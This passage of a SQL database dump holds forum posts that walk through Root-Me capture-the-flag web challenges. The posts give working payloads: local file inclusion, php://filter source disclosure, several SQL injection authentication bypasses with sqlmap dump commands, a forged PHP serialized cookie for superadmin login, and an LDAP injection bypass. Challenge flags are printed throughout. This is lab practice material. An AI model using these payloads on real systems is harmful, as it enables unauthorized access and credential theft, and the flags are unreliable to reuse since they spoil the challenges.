subir ese archivo y…</p><p style=\"\" class=\"\"><img class=\"alignnone size-full wp-image-279\" src=\"http://sebastiancort.es/blog/wp-content/uploads/2016/09/rootme_nullbyte04.png\" alt=\"rootme_nullbyte04\" width=\"481\" height=\"330\" srcset=\"http://sebastiancort.es/blog/wp-content/uploads/2016/09/rootme_nullbyte04.png 481w, http://sebastiancort.es/blog/wp-content/uploads/2016/09/rootme_nullbyte04-300x206.png 300w\" sizes=\"(max-width: 481px) 100vw, 481px\" style=\"margin: 5px 20px 20px 0px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top; max-width: 100%; height: auto;\"></p><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\"><img class=\"alignnone size-full wp-image-281\" src=\"http://sebastiancort.es/blog/wp-content/uploads/2016/09/rootme_nullbyte06.png\" alt=\"rootme_nullbyte06\" width=\"634\" height=\"229\" srcset=\"http://sebastiancort.es/blog/wp-content/uploads/2016/09/rootme_nullbyte06.png 634w, http://sebastiancort.es/blog/wp-content/uploads/2016/09/rootme_nullbyte06-300x108.png 300w\" sizes=\"(max-width: 634px) 100vw, 634px\" style=\"margin: 5px 20px 20px 0px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top; max-width: 100%; height: auto;\"><br></p><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\">¡Bingo! Tenemos el flag/password del challenge.</p><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\"><code><span style=\"color: rgb(68, 68, 68); font-family: Ubuntu, Roboto, Arial, Verdana, Helvetica, sans-serif; white-space: normal;\">YPNchi2NmTwygr2dgCCF</span></code></p></div></div><p class=\"sceditor-nlf\"><br></p>', 71, 1, 3, 0, '2016-12-07 21:24:13', '2016-12-07 13:24:13', '2016-12-07 13:24:13'),
(24, 0, '[Web server] Local file inclusion (ch16) (simplest)', 'web-server-local-file-inclusion--ch16--simplest', '<p>Use this URL:&nbsp;<code>http://challenge01.root-me.org/web-serveur/ch16/?files=../&amp;f=admin/index.php<br></code></p><p>Flag:&nbsp;<code>OpbNJ60xYpvAQU8<br></code></p><p>More details:&nbsp;<a href=\"http://www.cnblogs.com/joy-nick/p/5569475.html\">http://www.cnblogs.com/joy-nick/p/5569475.html</a></p>', 71, 2, 11, 0, '2017-01-07 19:48:01', '2017-01-07 11:48:01', '2017-01-07 11:48:01'),
(25, 0, '[Web server] PHP filters', 'web-server-php-filters', '<p>Yeah, the title is pretty clear, we\'ll use php filter to solve this problem.</p><p>Now, using&nbsp;<span style=\"background-color: rgb(245, 245, 245); color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px;\">php://filter/convert.base64-encode/resource=[file_path]</span></p><p>eah, the title is pretty clear, we\'ll use php filter to solve this problem.</p><div>Like this:&nbsp;<code>http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=login.php<br></code></div><p class=\"sceditor-nlf\">we\'ll get login.php source code in base64_encode, put it in php to decode:</p><p class=\"sceditor-nlf\"><code>&lt;<br>echo base64_decode(\'\');<br />\r\n?&gt;<br></code>we get login.php source code:&nbsp;</p><p class=\"sceditor-nlf\"><code>&lt;?php<br />\r\ninclude(\"config.php\");<br />\r\n<br />\r\nif ( isset($_POST[\"username\"]) &amp;&amp; isset($_POST[\"password\"]) ){<br />\r\n    if ($_POST[\"username\"]==$username &amp;&amp; $_POST[\"password\"]==$password){<br />\r\n      print(\"&lt;h2&gt;Welcome back !&lt;/h2&gt;\");<br />\r\n      print(\"To validate the challenge use this password&lt;br/&gt;&lt;br/&gt;\");<br />\r\n    } else {<br />\r\n      print(\"&lt;h3&gt;Error : no such user/password&lt;/h2&gt;&lt;br /&gt;\");<br />\r\n    }<br />\r\n} else {<br />\r\n?&gt;<br />\r\n<br />\r\n&lt;form action=\"\" method=\"post\"&gt;<br />\r\n  Login&amp;nbsp;&lt;br/&gt;<br />\r\n  &lt;input type=\"text\" name=\"username\" /&gt;&lt;br/&gt;&lt;br/&gt;<br />\r\n  Password&amp;nbsp;&lt;br/&gt;<br />\r\n  &lt;input type=\"password\" name=\"password\" /&gt;&lt;br/&gt;&lt;br/&gt;<br />\r\n  &lt;br/&gt;&lt;br/&gt;<br />\r\n  &lt;input type=\"submit\" value=\"connect\" /&gt;&lt;br/&gt;&lt;br/&gt;<br />\r\n&lt;/form&gt;<br />\r\n<br />\r\n&lt;?php } ?&gt;<br></code>Obviously user data was stored in config.php, so we\'ll read config.php through php://filter again:</p><p class=\"sceditor-nlf\"><code>http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php<br></code>we have:&nbsp;<code>&lt;?php<br />\r\n<br />\r\n$username=\"admin\";<br />\r\n$password=\"DAPt9D2mky0APAF\";<br />\r\n<br />\r\n?&gt;<br></code></p><p class=\"sceditor-nlf\"><b>Bingo!</b></p><p class=\"sceditor-nlf\"><b><code><span style=\"font-weight: normal;\">DAPt9D2mky0APAF</span><br></code><br></b></p>', 71, 2, 2, 0, '2017-01-07 23:49:51', '2017-01-07 15:49:51', '2017-01-07 15:49:51'),
(26, 0, '[Web server] SQL injection - authentication (simplest) [ch9]', 'web-server-sql-injection---authentication-simplest-ch9', '<p>Okay, the easiest!</p><p>POST data: <code>login=abc\' OR \'1\' = \'1\' ORDER BY 1 -- \' hello &amp;password=abc<br></code></p><p class=\"sceditor-nlf\">Done!</p>', 71, 2, 2, 0, '2017-01-07 23:53:50', '2017-01-07 15:53:50', '2017-01-07 15:53:50'),
(27, 0, '[Web server] SQL injection - authentication - GBK', 'web-server-sql-injection---authentication---gbk', '<p>Well, this is a bit harder than the previous, since we can\'t use strictly single quote sign (&nbsp;<b><font color=\"#ff3333\">\'</font>&nbsp;</b>), so we have to use some tricks here.</p><p>Note that there\'s hint \"Do you speak chinese ?\", GBK is a chinese encoding type.</p><p>So <b>%D5</b> is a special character that skip <b>mysql_escape_string </b>(kind a like %00 is a special character for null-byte, which is the end point of the string),<b> %D5</b> is erased from string after&nbsp;<b>mysql_escape_string&nbsp;</b></p><p>So, our POST data:</p><p><code><span style=\"color: rgb(68, 68, 68); font-family: Ubuntu, Roboto, Arial, Verdana, Helvetica, sans-serif; white-space: normal;\">login=1%D5\' OR 1=1 # &amp;password=abc</span><br></code>Problem solved!</p><p>Read more:&nbsp;<a href=\"http://www.myhack58.com/Article/html/3/7/2012/33747.htm\">http://www.myhack58.com/Article/html/3/7/2012/33747.htm</a></p>', 71, 2, 1, 0, '2017-01-07 23:57:42', '2017-01-07 15:57:42', '2017-01-07 15:57:42'),
(28, 0, '[Web server] SQL injection - string', 'web-server-sql-injection---string', '<p>Yeah, basicly use the search form</p><p>http://challenge01.root-me.org/web-serveur/ch19/?action=recherche</p><p>POST data:&nbsp;</p><p>To know how many columns to union:</p><p><code>recherche=a order by n<br></code>n = 3 is the maximum validate value of n.</p><p>So there are 3 colums. We get union</p><p><code>recherche=a\' union all select username,password from users -- - fdg<br></code>Above is a bit tricky, we\'ve already known the table name is users, so it\'s easy.</p><p>Below is something more general. We use sql-map.</p><p><br></p><hr id=\"null\"><p><br></p><p>--- This uses SQLite, try this in sqlmap ---</p><p><code>python sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche\" --data=\"recherche=a\" --level=5<br></code></p><p><i>(--level=5 is optional)</i></p><p><i><br></i></p><p>Woala! Now let\'s fetch tables:</p><p></p><code><p>python sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche\" --data=\"recherche=a\" --tables</p></code><p>Haha, we\'ve got it:</p><p></p><code><p>Database: SQLite_masterdb</p><p>[2 tables]</p><p>+-------+</p><p>| news &nbsp;|</p><p>| users |</p><p>+-------+</p></code><p><br></p><p>Ok, now let\'s get some rows!</p><p></p><code><p>python sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch19/?action=recherche\" --data=\"recherche=a\" --dump -D users</p></code><p>Perfect response:</p><p></p><code><p>Database: SQLite_masterdb</p><p>Table: users</p><p>[3 entries]</p><p>+------+----------+-----------------+</p><p>| Year | username | password &nbsp; &nbsp; &nbsp; &nbsp;|</p><p>+------+----------+-----------------+</p><p>| 2006 | user1 &nbsp; &nbsp;| OK4dSoYE &nbsp; &nbsp; &nbsp; &nbsp;|</p><p>| 2005 | admin &nbsp; &nbsp;| c4K04dtIaJsuWdi | <span class=\"Apple-tab-span\" style=\"white-space:pre\">		</span>&lt;~~~ there goes the flag!</p><p>| 2008 | user2 &nbsp; &nbsp;| 8Wbhkzmd &nbsp; &nbsp; &nbsp; &nbsp;|</p><p>+------+----------+-----------------+</p></code><p><br></p>', 71, 2, 4, 0, '2017-01-08 00:02:01', '2017-01-07 16:02:01', '2017-01-07 16:02:01'),
(29, 0, '[Web server] SQL injection - numeric', 'web-server-sql-injection---numeric', '<p>Once again, SQLmap is just perfect!</p><p><code>python sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1\" --tables<br></code></p><p>Well, it takes really long time to fetch table names, but since we know the name contains admin is \'<b>user</b>\', then just simply dump it: <code>python sqlmap.py -u \"http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1\" --dump -D users<br></code></p><p>Woala! Things\' solved!</p><p><br></p><hr id=\"null\"><p><br></p><p>Or, we can just simply get back to basic, simple url would work:&nbsp;</p><p><code>http://challenge01.root-me.org/web-serveur/ch18/?action=news&amp;news_id=1 union select username,password,3 from users -- -df<br></code></p><p>And hell ya, works like a charm!</p>', 71, 2, 3, 0, '2017-01-08 00:02:54', '2017-01-07 16:02:54', '2017-01-07 16:02:54'),
(30, 0, '[Web server] PHP Serialization', 'web-server-php-serialization', '<div>First thing everytime seeing source code is to check it:&nbsp;<a href=\"http://challenge01.root-me.org/web-serveur/ch28/index.php?showsource\">http://challenge01.root-me.org/web-serveur/ch28/index.php?showsource</a></div><code>&lt;?php<br />\r\ndefine(\'INCLUDEOK\', true);<br />\r\nsession_start();<br />\r\n<br />\r\nif(isset($_GET[\'showsource\'])){<br />\r\n    show_source(__FILE__);<br />\r\n    die;<br />\r\n}<br />\r\n<br />\r\n/******** AUTHENTICATION *******/<br />\r\n// login / passwords in a PHP array (sha256 for passwords) !<br />\r\nrequire_once(\'./passwd.inc.php\');<br />\r\n<br />\r\n<br />\r\nif(!isset($_SESSION[\'login\']) || !$_SESSION[\'login\']) {<br />\r\n    $_SESSION[\'login\'] = \"\";<br />\r\n    // form posted ?<br />\r\n    if($_POST[\'login\'] &amp;&amp; $_POST[\'password\']){<br />\r\n        $data[\'login\'] = $_POST[\'login\'];<br />\r\n        $data[\'password\'] = hash(\'sha256\', $_POST[\'password\']);<br />\r\n    }<br />\r\n    // autologin cookie ?<br />\r\n    else if($_COOKIE[\'autologin\']){<br />\r\n        $data = unserialize($_COOKIE[\'autologin\']);<br />\r\n        $autologin = \"autologin\";<br />\r\n    }<br />\r\n<br />\r\n    // check password !<br />\r\n    if ($data[\'password\'] == $auth[ $data[\'login\'] ] ) {<br />\r\n        $_SESSION[\'login\'] = $data[\'login\'];<br />\r\n<br />\r\n        // set cookie for autologin if requested<br />\r\n        if($_POST[\'autologin\'] === \"1\"){<br />\r\n            setcookie(\'autologin\', serialize($data));<br />\r\n        }<br />\r\n    }<br />\r\n    else {<br />\r\n        // error message<br />\r\n        $message = \"Error : $autologin authentication failed !\";<br />\r\n    }<br />\r\n}<br />\r\n/*********************************/<br />\r\n?&gt;<br />\r\n<br />\r\n<br />\r\n<br />\r\n&lt;html&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;style&gt;<br />\r\nlabel {<br />\r\n    display: inline-block;<br />\r\n    width:150px;<br />\r\n    text-align:right;<br />\r\n}<br />\r\ninput[type=\'password\'], input[type=\'text\'] {<br />\r\n    width: 120px;<br />\r\n}<br />\r\n&lt;/style&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;h1&gt;Restricted Access&lt;/h1&gt;<br />\r\n<br />\r\n&lt;?php<br />\r\n<br />\r\n// message ?<br />\r\nif(!empty($message))<br />\r\n    echo \"&lt;p&gt;&lt;em&gt;$message&lt;/em&gt;&lt;/p&gt;\";<br />\r\n<br />\r\n// admin ?<br />\r\nif($_SESSION[\'login\'] === \"superadmin\"){<br />\r\n    require_once(\'admin.inc.php\');<br />\r\n}<br />\r\n// user ?<br />\r\nelseif (isset($_SESSION[\'login\']) &amp;&amp; $_SESSION[\'login\'] !== \"\"){<br />\r\n    require_once(\'user.inc.php\');<br />\r\n}<br />\r\n// not authenticated ? <br />\r\nelse {<br />\r\n?&gt;<br />\r\n&lt;p&gt;Demo mode with guest / guest !&lt;/p&gt;<br />\r\n<br />\r\n&lt;p&gt;&lt;strong&gt;superadmin says :&lt;/strong&gt; New authentication mechanism without any database. &lt;a href=\"index.php?showsource\"&gt;Our source code is available here.&lt;/a&gt;&lt;/p&gt;<br />\r\n<br />\r\n&lt;form name=\"authentification\" action=\"index.php\" method=\"post\"&gt;<br />\r\n&lt;fieldset style=\"width:400px;\"&gt;<br />\r\n&lt;p&gt;<br />\r\n    &lt;label&gt;Login :&lt;/label&gt;<br />\r\n    &lt;input type=\"text\" name=\"login\" value=\"\" /&gt;<br />\r\n&lt;/p&gt;<br />\r\n&lt;p&gt;<br />\r\n    &lt;label&gt;Password :&lt;/label&gt;<br />\r\n    &lt;input type=\"password\" name=\"password\" value=\"\" /&gt;<br />\r\n&lt;/p&gt;<br />\r\n&lt;p&gt;<br />\r\n    &lt;label&gt;Autologin next time :&lt;/label&gt;<br />\r\n    &lt;input type=\"checkbox\" name=\"autologin\" value=\"1\" /&gt;<br />\r\n&lt;/p&gt;<br />\r\n&lt;p style=\"text-align:center;\"&gt;<br />\r\n    &lt;input type=\"submit\" value=\"Authenticate\" /&gt;<br />\r\n&lt;/p&gt;<br />\r\n&lt;/fieldset&gt;<br />\r\n&lt;/form&gt;<br />\r\n&lt;?php<br />\r\n}<br />\r\n<br />\r\nif(isset($_SESSION[\'login\']) &amp;&amp; $_SESSION[\'login\'] !== \"\"){<br />\r\n    echo \"&lt;p&gt;&lt;a href=\'disconnect.php\'&gt;Disconnect&lt;/a&gt;&lt;/p&gt;\";<br />\r\n}<br />\r\n?&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</code><div></div><div>From the site we have demo account to login:&nbsp;<span style=\"background-color: rgb(237, 236, 236); color: rgb(118, 118, 118); font-family: &quot;Open Sans&quot;, sans-serif, Arial; font-size: 13px;\">guest / guest</span></div><div>Login to this and we have cookie value&nbsp;<code>a:2:{s:5:\"login\";s:5:\"guest\";s:8:\"password\";s:64:\"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec\";}</code></div><div><div>Where&nbsp;<b>s</b>&nbsp;stands for&nbsp;<b><i>string</i></b>,&nbsp;<b>5</b>&nbsp;stands for&nbsp;<b>s.<i>length</i></b>, \"<b>login</b>\" is the value.</div><div></div><div>Check the code, we can see it uses&nbsp;<b>==</b>&nbsp;instead of&nbsp;<b>===</b>&nbsp;to check password:&nbsp;</div></div><div><code>if ($data[\'password\'] == $auth[ $data[\'login\'] ] )</code></div><div>It reminds us of PHP type juggling, we\'ll change password from&nbsp;<b><i>string</i>&nbsp;(real password)</b>&nbsp;to&nbsp;<b><i>bool</i>&nbsp;(true)&nbsp;</b>to login to any account without knowing the password.<div>And in the source we also have:&nbsp;</div><code>if($_SESSION[\'login\'] === \"superadmin\")</code></div><div>So the admin username is:&nbsp;<b>superadmin</b></div><div></div><div>Therefore the&nbsp;<b>autologin</b>&nbsp;data should be:&nbsp;<code>a:2:{s:5:\"login\";s:10:\"superadmin\";s:8:\"password\";b:1;}</code></div><div></div><div>Using&nbsp;<b>Cookie Manager+</b>&nbsp;or anything similar to change cookie. Remember that we must urlencode the data to avoid special characters like&nbsp;<b><font color=\"#ff3333\">;</font></b>We could use php to do this:&nbsp;</div><code>$data = \'a:2:{s:5:\"login\";s:10:\"superadmin\";s:8:\"password\";b:1;}\';<br />\r\n$uns = unserialize($data);<br />\r\nprint_r($uns);<br />\r\necho urlencode($data);</code><div>And the final cookie content to paste:&nbsp;<code>a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D</code></div><img src=\"http://localhost/mRoom/data/img/php_serialize.png\"><div></div><div>Perfect result!</div><div><code>NoUserInputInPHPSerialization!</code><div></div><div>See more:&nbsp;<a href=\"http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20POC2009%20Shocking%20News%20In%20PHP%20Exploitation.pdf\">POC2009 Shocking News In PHP Exploitation</a></div></div>', 71, 2, 33, 0, '2017-01-08 18:40:15', '2017-01-08 10:40:15', '2017-01-08 10:40:15');
INSERT INTO `topic` (`id`, `type`, `title`, `link`, `content`, `fid`, `uid`, `views`, `replies`, `created`, `modified`, `last_post`) VALUES
(31, 0, '[Web server] LDAP injection - authentication', 'web-server-ldap-injection-authentication', '<p>This is quite like SQL injection, we have LDAP syntax filters something like:&nbsp;<code>(&amp;(username=uname)(password=pwd))</code></p><p class=\"sceditor-nlf\">So we can inject to turn the filter into:&nbsp;<code>(&amp;(username=uname)(&amp;))(password=pwd))<br></code></p><p class=\"sceditor-nlf\">or&nbsp;<code>(&amp;(username=uname)(1=1))(password=pwd))<br></code></p><p class=\"\" style=\"\">So it\'ll ignore the password check.<br></p><p class=\"\" style=\"\">Apply to this, we enter username:&nbsp;<b>admin)(&amp;) </b>and we\'ll get:<code>ERROR : Invalid LDAP syntax : (&amp;(uid=admin)(&amp;))(userPassword=DAPt9D2mky0APAF))<br></code></p><p class=\"sceditor-nlf\">Here we go... A little struggle when it does not bypass password check but returns an error. This means it checks the syntax before handling.</p><p class=\"sceditor-nlf\"><br></p><p class=\"sceditor-nlf\">Okay, at least we know the syntax of LDAP, it uses <b>AND</b> operator.</p><p class=\"sceditor-nlf\">The syntax would be:&nbsp;<code>(&amp;(uid=)(userPassword=))<br></code></p><p class=\"sceditor-nlf\">Or we can say:&nbsp;<b>&amp;<font color=\"#ff3333\">(a)</font><font color=\"#3333ff\">(b)</font></b><br></p><p class=\"sceditor-nlf\">And it prevents <b>&amp;<font color=\"#ff3333\">(a)</font><font color=\"#3333ff\">(b)</font><font color=\"#9933ff\">(c)</font></b> syntax</p><p class=\"sceditor-nlf\">So let\'s try this syntax: <b>&amp;<font color=\"#ff3333\">(a)</font><font color=\"#3333ff\">(</font><font color=\"#ff3399\">|</font><font color=\"#9933cc\">(b)</font><font color=\"#336633\">(c)</font><font color=\"#3333ff\">)&nbsp;</font></b>It\'s just like&nbsp;<b>&amp;<font color=\"#ff3333\">(a)</font><font color=\"#3333ff\">(B)</font></b>&nbsp;syntax.</p><p class=\"sceditor-nlf\">Where&nbsp;<b><font color=\"#3333ff\">(</font><font color=\"#ff3399\">|</font><font color=\"#9933cc\">(b)</font><font color=\"#336633\">(c)</font><font color=\"#3333ff\">)</font></b>&nbsp;and&nbsp;<b><font color=\"#ff3333\">(a)</font></b>&nbsp;return true.</p><p class=\"sceditor-nlf\">So,&nbsp;<b><font color=\"#ff3333\">(a)</font></b>&nbsp;should be&nbsp;<b><font color=\"#ff3333\">(uid=*)&nbsp;</font></b><i>Since&nbsp;<b>objectClass=*</b>&nbsp;always returns an object (p.10/17&nbsp;<a href=\"http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202008%20%20-%20LDAP%20Injection%20&amp;%20Blind%20LDAP%20Injection.pdf\">.pdf</a>)</i></p><p class=\"sceditor-nlf\">And&nbsp;<b><font color=\"#3333ff\">(</font><font color=\"#ff3399\">|</font><font color=\"#9933cc\">(b)</font><font color=\"#336633\">(c)</font><font color=\"#3333ff\">)&nbsp;</font></b>should be&nbsp;<b><font color=\"#3333ff\">(</font><font color=\"#ff3399\">|</font><font color=\"#9933cc\">(true)</font><font color=\"#336633\">(userPassword=test_password_doesnt_make_sense)</font><font color=\"#3333ff\">)</font></b>&nbsp;</p><p class=\"sceditor-nlf\">where the (true) part is something return true, since it means nothing to parse true there. It only works around 2 filters: uid and userPassword.</p><p class=\"sceditor-nlf\">So&nbsp;<b><font color=\"#9933cc\">(true)</font></b>&nbsp;part should be replaced by:&nbsp;<b><font color=\"#9933cc\">(userPassword=*)&nbsp;</font></b><i>Since&nbsp;<b>objectClass=*</b>&nbsp;always returns an object (p.10/17&nbsp;<a href=\"http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202008%20%20-%20LDAP%20Injection%20&amp;%20Blind%20LDAP%20Injection.pdf\">.pdf</a>)</i></p><p class=\"sceditor-nlf\"><br></p><p class=\"sceditor-nlf\">So, final LDAP syntax should be:&nbsp;<b>(&amp;(uid=*)(|(userPassword=*)(userPassword=test)))</b></p><p class=\"sceditor-nlf\">So, inject part is: (&amp;(uid=<b><font color=\"#ff3333\">*)(|(userPassword=*</font></b>)(userPassword=<b><font color=\"#3333ff\">test)</font></b>))</p><p class=\"sceditor-nlf\">So, final input:</p><p class=\"sceditor-nlf\"><ul><li>username:&nbsp;<b><font color=\"#ff3333\">*)(|(</font></b><b><font color=\"#ff3333\">userPassword=*</font></b><br></li><li>password:&nbsp;<b><font color=\"#3333ff\">test)</font></b><br></li></ul></p><p class=\"sceditor-nlf\">And tada!</p><p class=\"sceditor-nlf\"><img src=\"http://localhost/mRoom/data/img/LDAP.png\"><br></p><p class=\"sceditor-nlf\">The flag:&nbsp;<code>SWRwehpkTI3Vu2F9DoTJJ0LBO<br></code></p><p class=\"sceditor-nlf\"><br></p>', 71, 2, 19, 0, '2017-01-09 16:41:51', '2017-01-09 08:41:51', '2017-01-09 08:41:51'),
(32, 0, '[Programming] Go back to college', 'programming-go-back-to-college', 'Simply connect to IRC channel and send data.Install nodejs, <code>npm install irc</code><div>r1.js</div><code>var irc = require(\'irc\');<br />\r\n<br />\r\nvar server = \'irc.root-me.org\';<br />\r\nvar chan = \'#root-me_challenge\';<br />\r\nvar bot = \'Candy\';<br />\r\n<br />\r\nvar client = new irc.Client(server, \'test_user\', {<br />\r\n    debug: true,<br />\r\n    channels: [chan]<br />\r\n});<br />\r\n<br />\r\n//Bot Candy<br />\r\nclient.addListener(\'registered\', function (message) {<br />\r\n    console.log(\'registered\', message);<br />\r\n    client.say(bot, \"!ep1\");<br />\r\n});<br />\r\n<br />\r\nclient.addListener(\'message\'+chan, function (from, to, message) {<br />\r\n    console.log(from + \' =&gt; \' + to + \': \' + message);<br />\r\n});<br />\r\n<br />\r\nclient.addListener(\'pm\', function (from, message) {<br />\r\n    console.log(from + \' =&gt; ME: \' + message);<br />\r\n    if (from === bot) {<br />\r\n		if (message.indexOf(\'/\') !== -1) {<br />\r\n			var nbs = message.split(\'/\');<br />\r\n			var nb1 = parseInt(nbs[0], 10);<br />\r\n			var nb2 = parseInt(nbs[1], 10);<br />\r\n<br />\r\n			var square = Math.sqrt(nb1);<br />\r\n			var total = square * nb2;<br />\r\n			var result = total.toFixed(2);<br />\r\n<br />\r\n			console.log(\'Result\', result);<br />\r\n<br />\r\n			client.say(bot, \"!ep1 -rep \" + result);<br />\r\n		}<br />\r\n    }<br />\r\n});<br />\r\n</code><div></div><div>Compile r1.js&nbsp;</div><code>node \"_files/r1.js\"</code><div></div><div>Return data:</div><code>E:\\Devs\\node-v6.9.4&gt;node \"_files/r1.js\"<br />\r\n10 Jan 22:07:04 - Sending irc NICK/USER<br />\r\n10 Jan 22:07:04 - SEND: NICK test_user<br />\r\n10 Jan 22:07:04 - SEND: USER nodebot 8 * :nodeJS IRC client<br />\r\nregistered { prefix: \'irc.hackerzvoice.net\',<br />\r\n  server: \'irc.hackerzvoice.net\',<br />\r\n  command: \'rpl_welcome\',<br />\r\n  rawCommand: \'